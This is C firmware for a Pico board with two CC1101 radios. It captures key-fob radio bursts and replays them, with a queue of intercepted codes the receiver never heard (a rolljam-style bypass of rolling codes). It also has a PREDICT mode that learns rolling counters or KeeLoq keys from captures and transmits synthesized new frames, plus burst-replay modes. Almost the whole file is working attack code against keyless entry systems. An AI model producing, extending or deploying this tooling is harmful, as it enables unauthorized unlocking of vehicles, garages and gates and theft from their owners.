/* CC1101 ASK/OOK capture and replay with unused-code queue and PREDICT mode.
 *
 * QUEUE replays stored bursts the receiver never heard. PREDICT learns a
 * rolling counter (and optionally KeeLoq) from successive captures, then
 * synthesizes and transmits a new waveform — never a stored one.
 */
#include "fwog_main.h"
#include "fs/fwog_fs.h"
#include "fob_proto.h"
#include "fob_predict.h"
#include "dg_file.h"
#include "dg_fs.h"
#include "hardware/gpio.h"
#include "pico/stdlib.h"
#include <stdio.h>
#include <string.h>

FWOG_WATCHDOG_DEFAULT();

#define FOB_MAX_EDGES       768u
#define FOB_GAP_US          25000u
#define FOB_WAIT_MS         8000u
#define FOB_CAPTURE_MS      4000u
#define FOB_MIN_EDGES       16u
#define FOB_SPI_HZ          1000000u
#define FOB_BURST_GAP_MS    80u

typedef struct {
    bool     occupied;
    bool     unused;
    bool     first_level;
    uint8_t  radio;
    uint16_t n;
    uint32_t freq_hz;
    uint32_t total_us;
    int16_t  rssi;
    uint16_t dur[FOB_MAX_EDGES];
} fob_slot_t;

static cc1101_t       s_radio[2];
static fwog_link_rx_t s_rx;
static fob_cmd_t      s_cmd;
static bool           s_cmd_fresh;
static uint8_t        s_state = FOB_ST_BOOT;
static bool           s_radio_ok[2];
static fob_slot_t     s_slot[FOB_SLOTS];
static fob_slot_t     s_pred_ref;
static fob_predict_t  s_predict;
static uint8_t        s_env[FOB_ENV_BINS];
static uint16_t       s_last_edges;
static uint32_t       s_last_total_us;
static uint8_t        s_seq;
static uint8_t        s_order[FOB_SLOTS];

static cc1101_t *radio(uint8_t which) {
    return &s_radio[which ? 1u : 0u];
}

static uint8_t count_occ(void) {
    if (s_cmd.mode == FOB_MODE_PREDICT) return s_predict.ncaptures;
    uint8_t n = 0;
    for (uint8_t i = 0; i < FOB_SLOTS; i++) if (s_slot[i].occupied) n++;
    return n;
}

static uint8_t count_unused(void) {
    uint8_t n = 0;
    for (uint8_t i = 0; i < FOB_SLOTS; i++)
        if (s_slot[i].occupied && s_slot[i].unused) n++;
    return n;
}

static uint8_t next_unused(void) {
    int best_i = -1;
    for (uint8_t i = 0; i < FOB_SLOTS; i++) {
        if (!s_slot[i].occupied || !s_slot[i].unused) continue;
        if (best_i < 0) { best_i = (int)i; continue; }
        if ((int8_t)(s_order[i] - s_order[best_i]) < 0) best_i = (int)i;
    }
    return best_i < 0 ? 0xFFu : (uint8_t)best_i;
}

static uint8_t latest_slot(void) {
    int best_i = -1;
    for (uint8_t i = 0; i < FOB_SLOTS; i++) {
        if (!s_slot[i].occupied) continue;
        if (best_i < 0) { best_i = (int)i; continue; }
        const int8_t d = (int8_t)(s_order[i] - s_order[best_i]);
        if (d > 0) best_i = (int)i;
    }
    return best_i < 0 ? 0xFFu : (uint8_t)best_i;
}

static uint8_t alloc_slot(void) {
    for (uint8_t i = 0; i < FOB_SLOTS; i++) {
        if (!s_slot[i].occupied) return i;
    }
    int best_i = -1;
    for (uint8_t i = 0; i < FOB_SLOTS; i++) {
        if (s_slot[i].unused) continue;
        if (best_i < 0) { best_i = (int)i; continue; }
        const int8_t d = (int8_t)(s_order[i] - s_order[best_i]);
        if (d < 0) best_i = (int)i;
    }
    if (best_i >= 0) return (uint8_t)best_i;
    best_i = -1;
    for (uint8_t i = 0; i < FOB_SLOTS; i++) {
        if (best_i < 0) { best_i = (int)i; continue; }
        const int8_t d = (int8_t)(s_order[i] - s_order[best_i]);
        if (d < 0) best_i = (int)i;
    }
    return best_i < 0 ? 0 : (uint8_t)best_i;
}

static void fill_env(const uint16_t *dur, uint16_t n) {
    memset(s_env, 0, sizeof s_env);
    uint32_t total = 0;
    for (uint16_t i = 0; i < n; i++) total += dur[i];
    if (total == 0u) return;
    uint32_t acc = 0;
    for (uint16_t i = 0; i < n; i++) {
        unsigned b = (unsigned)((acc * (uint32_t)FOB_ENV_BINS) / total);
        if (b >= FOB_ENV_BINS) b = FOB_ENV_BINS - 1u;
        uint8_t h = 1u;
        if (dur[i] >= 4000u) h = 24u;
        else h = (uint8_t)((dur[i] * 24u) / 4000u);
        if (h == 0u) h = 1u;
        if (h > s_env[b]) s_env[b] = h;
        acc += dur[i];
    }
}

static void fob_sanitize_stem(char *dst, size_t cap, const char *src) {
    size_t n = 0;
    if (!dst || cap < 2u) return;
    dst[0] = '\0';
    if (!src) return;
    for (; *src && n + 1u < cap && n < 8u; src++) {
        char c = *src;
        if (c >= 'a' && c <= 'z') c = (char)(c - 'a' + 'A');
        if ((c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9'))
            dst[n++] = c;
    }
    dst[n] = '\0';
}

static bool fob_named_path(char *path, size_t cap, const char *stem) {
    char name[13];
    unsigned i;
    size_t sl;
    if (!path || cap < 28u || !stem || !stem[0]) return false;
    sl = strlen(stem);
    snprintf(name, sizeof name, "%s.BIN", stem);
    snprintf(path, cap, "/fobreplay/%s", name);
    if (!fwog_fs_exists(path)) return true;
    if (sl >= 8u) return false;
    for (i = 1u; i < 100u; i++) {
        const unsigned digits = (i < 10u) ? 1u : 2u;
        if (sl + digits > 8u) break;
        snprintf(name, sizeof name, "%s%u.BIN", stem, i);
        snprintf(path, cap, "/fobreplay/%s", name);
        if (!fwog_fs_exists(path)) return true;
    }
    return false;
}

static void save_capture(const fob_slot_t *s, const char *stem) {
    dg_hdr_t h;
    dg_ook_lead_t lead;
    unsigned idx;
    char name[20];
    char path[32];
    char stem8[FOB_STEM_N];
    bool named = false;
    if (s == NULL || !s->occupied || s->n < FOB_MIN_EDGES) return;
    if (!dg_fs_ensure_dir("/fobreplay")) {
        DIAG("[fobreplay] no /fobreplay (capture kept in RAM)\n");
        return;
    }
    fob_sanitize_stem(stem8, sizeof stem8, stem);
    if (stem8[0]) named = fob_named_path(path, sizeof path, stem8);
    if (!named) {
        idx = dg_fs_next_index("/fobreplay", "FOB");
        dg_format_name(name, sizeof name, "FOB", idx, "BIN");
        snprintf(path, sizeof path, "/fobreplay/%s", name);
    }
    dg_hdr_init(&h, DG_KIND_OOK, "fobreplay");
    h.payload_bytes = (uint32_t)(sizeof lead + (size_t)s->n * sizeof s->dur[0]);
    h.freq_hz = s->freq_hz;
    h.duration_us = s->total_us;
    h.peak_rssi = s->rssi;
    h.edges = s->n;
    h.first_level = s->first_level ? 1u : 0u;
    h.radio = s->radio;
    lead.n = s->n;
    lead.first_level = s->first_level ? 1u : 0u;
    lead.radio = s->radio;
    if (!fwog_fs_open(path, true, false)) {
        DIAG("[fobreplay] save open %s fail\n", path);
        return;
    }
    {
        const bool ok = fwog_fs_write(&h, sizeof h) &&
                        fwog_fs_write(&lead, sizeof lead) &&
                        fwog_fs_write(s->dur, (size_t)s->n * sizeof s->dur[0]);
        (void)fwog_fs_close();
        DIAG("[fobreplay] save %s %s\n", path, ok ? "ok" : "FAIL");
    }
}

static void send_status(int16_t rssi) {
    const uint8_t nxt = (s_cmd.mode == FOB_MODE_QUEUE) ? next_unused() : latest_slot();
    fob_status_t m;
    memset(&m, 0, sizeof m);
    m.type = FOB_MSG_STATUS;
    m.state = s_state;
    m.radio = s_cmd.radio;
    m.ok = s_radio_ok[s_cmd.radio ? 1u : 0u] ? 1u : 0u;
    m.rssi_dbm = rssi;
    m.edges = s_last_edges;
    m.freq_hz = s_cmd.freq_hz;
    m.mode = s_cmd.mode;
    m.slots = count_occ();
    m.unused = count_unused();
    m.next = nxt;
    m.last_total_us = s_last_total_us;
    memcpy(m.env, s_env, FOB_ENV_BINS);
    m.predictor = s_cmd.predictor;
    m.pred_key_ok = s_predict.kl_ok ? 1u : 0u;
    m.pred_counter = s_predict.pred_ctr;
    m.pred_frame = s_predict.pred_frame;
    (void)fwog_link_uart_send_frame(&m, sizeof m);
}

static void poll_link(void) {
    uint8_t b;
    size_t n;
    while (fwog_link_uart_read(&b)) {
        if (!fwog_link_rx_byte(&s_rx, b, &n)) continue;
        if (n >= sizeof(fob_cmd_t) && s_rx.buf[0] == FOB_MSG_CMD) {
            const uint8_t old_pred = s_cmd.predictor;
            memcpy(&s_cmd, s_rx.buf, sizeof s_cmd);
            if (s_cmd.radio > 1u) s_cmd.radio = 0u;
            if (s_cmd.mode > FOB_MODE_PREDICT) s_cmd.mode = FOB_MODE_SINGLE;
            if (s_cmd.predictor > FOB_PRED_KL) s_cmd.predictor = FOB_PRED_CTR;
            if (old_pred != s_cmd.predictor && s_predict.ncaptures >= 2u) {
                (void)fob_predict_update(&s_predict, s_cmd.predictor);
            }
            s_cmd_fresh = true;
        }
    }
}

static void gdo0_as_input(cc1101_t *r) {
    gpio_set_dir(r->gdo0_pin, GPIO_IN);
    gpio_pull_up(r->gdo0_pin);
}

static void gdo0_as_output(cc1101_t *r, bool level) {
    gpio_disable_pulls(r->gdo0_pin);
    gpio_set_dir(r->gdo0_pin, GPIO_OUT);
    gpio_put(r->gdo0_pin, level);
}

static bool configure_ook(cc1101_t *r, uint32_t hz) {
    if (!cc1101_freq_in_band(hz)) return false;
    bool ok = cc1101_idle(r);
    ok = ok && cc1101_set_frequency(r, hz);
    ok = ok && cc1101_set_modulation(r, CC1101_MOD_ASK);
    ok = ok && cc1101_set_pkt_format(r, 3u);
    ok = ok && cc1101_set_sync_mode(r, 0u);
    ok = ok && cc1101_set_crc(r, false);
    ok = ok && cc1101_set_white_data(r, false);
    ok = ok && cc1101_set_manchester(r, false);
    ok = ok && cc1101_set_append_status(r, false);
    ok = ok && cc1101_set_dc_filter_off(r, true);
    ok = ok && cc1101_set_rx_bandwidth(r, 270.0f);
    ok = ok && cc1101_set_data_rate(r, 10.0f);
    ok = ok && cc1101_set_power(r, 10);
    ok = ok && cc1101_write_reg(r, CC1101_REG_IOCFG0, 0x0Du);
    ok = ok && cc1101_write_reg(r, CC1101_REG_AGCCTRL2, 0x07u);
    ok = ok && cc1101_write_reg(r, CC1101_REG_AGCCTRL1, 0x00u);
    ok = ok && cc1101_write_reg(r, CC1101_REG_AGCCTRL0, 0x91u);
    gdo0_as_input(r);
    return ok;
}

static void listen(cc1101_t *r) {
    gdo0_as_input(r);
    (void)cc1101_write_reg(r, CC1101_REG_IOCFG0, 0x0Du);
    (void)cc1101_idle(r);
    (void)cc1101_flush_rx(r);
    (void)cc1101_rx(r);
}

static void wait_us(uint32_t us) {
    const uint32_t t0 = time_us_32();
    while ((uint32_t)(time_us_32() - t0) < us) tight_loop_contents();
}

static void have_or_listen(void) {
    if (s_cmd.mode == FOB_MODE_PREDICT) {
        s_state = (s_predict.ncaptures > 0u) ? FOB_ST_HAVE : FOB_ST_LISTEN;
    } else {
        s_state = (count_occ() > 0u) ? FOB_ST_HAVE : FOB_ST_LISTEN;
    }
}

static bool capture_into(cc1101_t *r, fob_slot_t *slot) {
    s_state = FOB_ST_WAIT;
    listen(r);
    send_status(cc1101_get_rssi(r));

    const uint32_t wait_until = to_ms_since_boot(get_absolute_time()) + FOB_WAIT_MS;
    uint32_t wait_st_ms = 0;
    bool last = cc1101_get_gdo0(r);
    bool saw = false;
    while (to_ms_since_boot(get_absolute_time()) < wait_until) {
        board_watchdog_kick();
        poll_link();
        if (s_cmd_fresh && s_cmd.cmd == FOB_CMD_ABORT) {
            s_cmd_fresh = false;
            return false;
        }
        const bool now = cc1101_get_gdo0(r);
        const int16_t rssi = cc1101_get_rssi(r);
        if (now != last && rssi > -85) {
            saw = true;
            last = now;
            break;
        }
        uint32_t now_ms = to_ms_since_boot(get_absolute_time());
        if (now_ms - wait_st_ms >= 200u) {
            wait_st_ms = now_ms;
            send_status(rssi);
        }
        sleep_ms(2);
    }
    if (!saw) {
        DIAG("[fobreplay] capture timed out waiting for a burst\n");
        return false;
    }

    s_state = FOB_ST_CAPTURE;
    send_status(cc1101_get_rssi(r));
    memset(slot, 0, sizeof *slot);
    slot->first_level = cc1101_get_gdo0(r);
    slot->radio = s_cmd.radio;
    slot->freq_hz = s_cmd.freq_hz;
    slot->rssi = cc1101_get_rssi(r);
    uint32_t t = time_us_32();
    last = slot->first_level;
    const uint32_t cap_until = to_ms_since_boot(get_absolute_time()) + FOB_CAPTURE_MS;
    uint32_t last_kick = to_ms_since_boot(get_absolute_time());
    int16_t peak = slot->rssi;

    while (to_ms_since_boot(get_absolute_time()) < cap_until && slot->n < FOB_MAX_EDGES) {
        const uint32_t now_ms = to_ms_since_boot(get_absolute_time());
        if (now_ms - last_kick > 400u) {
            board_watchdog_kick();
            last_kick = now_ms;
            const int16_t rssi = cc1101_get_rssi(r);
            if (rssi > peak) peak = rssi;
        }
        const bool bit = cc1101_get_gdo0(r);
        const uint32_t now = time_us_32();
        const uint32_t dt = now - t;
        if (bit != last) {
            slot->dur[slot->n++] = (uint16_t)(dt > 65535u ? 65535u : dt);
            slot->total_us += (dt > 65535u ? 65535u : dt);
            t = now;
            last = bit;
        } else if (slot->n >= FOB_MIN_EDGES && dt > FOB_GAP_US) {
            break;
        }
    }
    slot->rssi = peak;
    if (slot->n < FOB_MIN_EDGES) {
        DIAG("[fobreplay] dropped short burst (%u edges)\n", (unsigned)slot->n);
        return false;
    }
    slot->occupied = true;
    slot->unused = true;
    return true;
}

static void commit_slot(const fob_slot_t *tmp) {
    if (s_cmd.mode == FOB_MODE_PREDICT) {
        if (s_predict.ncaptures >= FOB_SLOTS) {
            DIAG("[fobreplay] predict buffer full\n");
            return;
        }
        if (!fob_predict_add(&s_predict, tmp->dur, tmp->n, tmp->first_level,
                             s_cmd.predictor)) {
            DIAG("[fobreplay] predict decode failed\n");
            return;
        }
        s_pred_ref = *tmp;
        s_last_edges = tmp->n;
        s_last_total_us = tmp->total_us;
        fill_env(tmp->dur, tmp->n);
        DIAG("[fobreplay] predict capture %u (pred=%s ctr=0x%04X key=%s)\n",
             (unsigned)s_predict.ncaptures,
             s_predict.pred_ok ? "ok" : "no",
             (unsigned)s_predict.pred_ctr,
             s_predict.kl_ok ? "Y" : "N");
        return;
    }

    const uint8_t i = (s_cmd.mode == FOB_MODE_SINGLE) ? 0u : alloc_slot();
    s_slot[i] = *tmp;
    if (s_cmd.mode == FOB_MODE_SINGLE) {
        for (uint8_t k = 1; k < FOB_SLOTS; k++) {
            s_slot[k].occupied = false;
            s_slot[k].unused = false;
        }
    }
    s_order[i] = s_seq++;
    s_last_edges = tmp->n;
    s_last_total_us = tmp->total_us;
    fill_env(tmp->dur, tmp->n);
    DIAG("[fobreplay] stored slot %u (%u edges, unused=%u)\n",
         (unsigned)i, (unsigned)tmp->n, (unsigned)count_unused());
    save_capture(tmp, NULL);
}

static bool tx_waveform(cc1101_t *r, bool first_level, const uint16_t *dur,
                        uint16_t n, int16_t rssi, uint8_t st) {
    if (n < FOB_MIN_EDGES) return false;
    s_state = st;
    s_last_edges = n;
    fill_env(dur, n);
    send_status(rssi);

    (void)cc1101_idle(r);
    (void)cc1101_write_reg(r, CC1101_REG_IOCFG0, 0x2Eu);
    gdo0_as_output(r, first_level);
    (void)cc1101_write_reg(r, CC1101_REG_IOCFG0, 0x0Du);
    if (!cc1101_tx(r)) {
        DIAG("[fobreplay] TX enter failed\n");
        gdo0_as_input(r);
        return false;
    }
    wait_us(400);
    bool level = first_level;
    for (uint16_t e = 0; e < n; e++) {
        gpio_put(r->gdo0_pin, level);
        wait_us(dur[e]);
        level = !level;
        if ((e & 127u) == 0u) board_watchdog_kick();
    }
    gpio_put(r->gdo0_pin, 0);
    (void)cc1101_idle(r);
    gdo0_as_input(r);
    (void)cc1101_write_reg(r, CC1101_REG_IOCFG0, 0x0Du);
    return true;
}

static bool replay_slot(cc1101_t *r, uint8_t i, bool consume) {
    if (i >= FOB_SLOTS || !s_slot[i].occupied || s_slot[i].n < FOB_MIN_EDGES) {
        DIAG("[fobreplay] replay empty slot\n");
        return false;
    }
    fob_slot_t *s = &s_slot[i];
    if (s->freq_hz != s_cmd.freq_hz) {
        if (!configure_ook(r, s->freq_hz)) return false;
    }
    s_last_total_us = s->total_us;
    const bool ok = tx_waveform(r, s->first_level, s->dur, s->n, s->rssi, FOB_ST_REPLAY);
    if (ok && consume) s->unused = false;
    DIAG("[fobreplay] replayed slot %u (%u edges)%s\n",
         (unsigned)i, (unsigned)s->n, consume ? " consumed" : "");
    return ok;
}

static void replay_one(cc1101_t *r) {
    if (s_cmd.mode == FOB_MODE_QUEUE) {
        const uint8_t i = next_unused();
        if (i == 0xFFu) {
            DIAG("[fobreplay] queue empty\n");
            return;
        }
        (void)replay_slot(r, i, true);
    } else {
        const uint8_t i = latest_slot();
        if (i == 0xFFu) return;
        (void)replay_slot(r, i, false);
    }
}

static void replay_burst(cc1101_t *r) {
    s_state = FOB_ST_BURST;
    uint8_t played = 0;
    for (;;) {
        board_watchdog_kick();
        const uint8_t i = next_unused();
        if (i == 0xFFu) break;
        if (!replay_slot(r, i, true)) break;
        played++;
        sleep_ms(FOB_BURST_GAP_MS);
    }
    DIAG("[fobreplay] burst played %u unused slots\n", (unsigned)played);
}

static void predict_tx(cc1101_t *r) {
    if (!s_predict.pred_ok || !s_pred_ref.occupied) {
        DIAG("[fobreplay] no prediction ready\n");
        return;
    }
    uint16_t synth[FOB_MAX_EDGES];
    uint16_t synth_n = 0;
    if (!fob_predict_synth(&s_predict, s_pred_ref.dur, s_pred_ref.n,
                           s_pred_ref.first_level, synth, &synth_n,
                           FOB_MAX_EDGES)) {
        DIAG("[fobreplay] predict synth failed\n");
        return;
    }
    uint32_t total = 0;
    for (uint16_t i = 0; i < synth_n; i++) total += synth[i];
    s_last_total_us = total;
    fill_env(synth, synth_n);
    const bool ok = tx_waveform(r, s_pred_ref.first_level, synth, synth_n,
                                s_pred_ref.rssi, FOB_ST_PREDICT);
    DIAG("[fobreplay] predict TX %s (%u edges, ctr=0x%04X frame=0x%08lX)\n",
         ok ? "ok" : "fail", (unsigned)synth_n, (unsigned)s_predict.pred_ctr,
         (unsigned long)s_predict.pred_frame);
}

static void predict_burst(cc1101_t *r) {
    for (unsigned i = 0; i < FOB_PRED_BURST_N; i++) {
        board_watchdog_kick();
        predict_tx(r);
        sleep_ms(FOB_BURST_GAP_MS);
    }
}

static void clear_all(void) {
    memset(s_slot, 0, sizeof s_slot);
    memset(&s_pred_ref, 0, sizeof s_pred_ref);
    fob_predict_clear(&s_predict);
    memset(s_env, 0, sizeof s_env);
    s_last_edges = 0;
    s_last_total_us = 0;
}

int main(void) {
    board_init();
    const fwog_display_result_t d = fwog_display_update_run();
    DIAG("[fobreplay] display: %s\n", fwog_display_result_text(d));

    s_cmd.type = FOB_MSG_CMD;
    s_cmd.cmd = FOB_CMD_LISTEN;
    s_cmd.radio = 0;
    s_cmd.mode = FOB_MODE_SINGLE;
    s_cmd.predictor = FOB_PRED_CTR;
    s_cmd.freq_hz = 315000000u;
    fob_predict_init(&s_predict);

    cc1101_bus_init(FOB_SPI_HZ);
    cc1101_bind(&s_radio[0], CC1101_RADIO_CS0);
    cc1101_bind(&s_radio[1], CC1101_RADIO_CS1);
    s_radio_ok[0] = cc1101_bringup(&s_radio[0]) && cc1101_probe(&s_radio[0]);
    s_radio_ok[1] = cc1101_bringup(&s_radio[1]) && cc1101_probe(&s_radio[1]);
    DIAG("[fobreplay] radio0=%s radio1=%s\n",
         s_radio_ok[0] ? "ok" : "fail", s_radio_ok[1] ? "ok" : "fail");

    fwog_link_rx_init(&s_rx);

    uint32_t tuned = 0;
    uint8_t tuned_radio = 0xFFu;
    absolute_time_t next_st = make_timeout_time_ms(200);
    if (s_radio_ok[0] && configure_ook(&s_radio[0], s_cmd.freq_hz)) {
        tuned = s_cmd.freq_hz;
        tuned_radio = 0;
        listen(&s_radio[0]);
        s_state = FOB_ST_LISTEN;
    } else {
        s_state = FOB_ST_ERROR;
    }

    static fob_slot_t tmp;

    while (true) {
        board_watchdog_kick();
        poll_link();

        if (s_cmd_fresh) {
            const uint8_t cmd = s_cmd.cmd;
            s_cmd_fresh = false;
            cc1101_t *r = radio(s_cmd.radio);
            const bool ok = s_radio_ok[s_cmd.radio ? 1u : 0u];
            if (!ok) {
                s_state = FOB_ST_ERROR;
            } else if (s_cmd.freq_hz != tuned || s_cmd.radio != tuned_radio) {
                if (configure_ook(r, s_cmd.freq_hz)) {
                    tuned = s_cmd.freq_hz;
                    tuned_radio = s_cmd.radio;
                    listen(r);
                    have_or_listen();
                } else {
                    s_state = FOB_ST_ERROR;
                }
            }
            if (ok && s_state != FOB_ST_ERROR) {
                if (cmd == FOB_CMD_CAPTURE) {
                    if (capture_into(r, &tmp)) commit_slot(&tmp);
                    listen(r);
                    have_or_listen();
                } else if (cmd == FOB_CMD_REPLAY) {
                    replay_one(r);
                    listen(r);
                    have_or_listen();
                } else if (cmd == FOB_CMD_BURST) {
                    if (s_cmd.mode == FOB_MODE_PREDICT) predict_burst(r);
                    else replay_burst(r);
                    listen(r);
                    have_or_listen();
                } else if (cmd == FOB_CMD_PREDICT_TX) {
                    predict_tx(r);
                    listen(r);
                    have_or_listen();
                } else if (cmd == FOB_CMD_PREDICT_BURST) {
                    predict_burst(r);
                    listen(r);
                    have_or_listen();
                } else if (cmd == FOB_CMD_SAVE) {
                    const fob_slot_t *src = NULL;
                    if (s_cmd.mode == FOB_MODE_PREDICT) {
                        if (s_pred_ref.occupied) src = &s_pred_ref;
                    } else {
                        const uint8_t i = latest_slot();
                        if (i != 0xFFu) src = &s_slot[i];
                    }
                    if (src) save_capture(src, s_cmd.name);
                    else DIAG("[fobreplay] SAVE with no capture\n");
                    listen(r);
                    have_or_listen();
                } else if (cmd == FOB_CMD_CLEAR) {
                    clear_all();
                    listen(r);
                    s_state = FOB_ST_LISTEN;
                    DIAG("[fobreplay] buffer cleared\n");
                } else {
                    listen(r);
                    have_or_listen();
                }
            }
            send_status(ok ? cc1101_get_rssi(r) : -128);
        }

        if (time_reached(next_st)) {
            next_st = make_timeout_time_ms(200);
            cc1101_t *r = radio(s_cmd.radio);
            const bool ok = s_radio_ok[s_cmd.radio ? 1u : 0u];
            send_status(ok ? cc1101_get_rssi(r) : -128);
        }
        sleep_ms(2);
    }
}
